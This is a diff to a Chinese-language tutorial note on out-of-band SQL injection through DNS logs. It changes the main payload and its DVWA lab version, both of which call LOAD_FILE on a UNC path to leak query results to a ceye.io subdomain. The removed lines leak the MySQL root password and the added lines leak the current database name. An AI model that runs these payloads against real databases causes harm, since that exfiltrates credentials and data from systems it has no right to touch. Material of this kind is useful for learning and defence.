@@ -48,9 +48,9 @@
     * 支持load_file()函数（高版本默认不支持）
     * 开启allow_url_fopen（默认开启）
 
-主体语句：`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM user WHERE user='root' LIMIT 1),'.b182oj.ceye.io\\abc'));`
+主体语句：`select load_file(concat('\\\\',hex((select database())),'.8dmer4.ceye.io\\abv'));`
 
-dvwa实战语句：`'and SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM user WHERE user='root' LIMIT 1),'.b182oj.ceye.io\\abc')) AnD '1'='1`
+dvwa实战语句：`1'and select load_file(concat('\\\\',hex((select database())),'.8dmer4.ceye.io\\abv')) AnD '1'='1`
 
 
 **UNC路径**
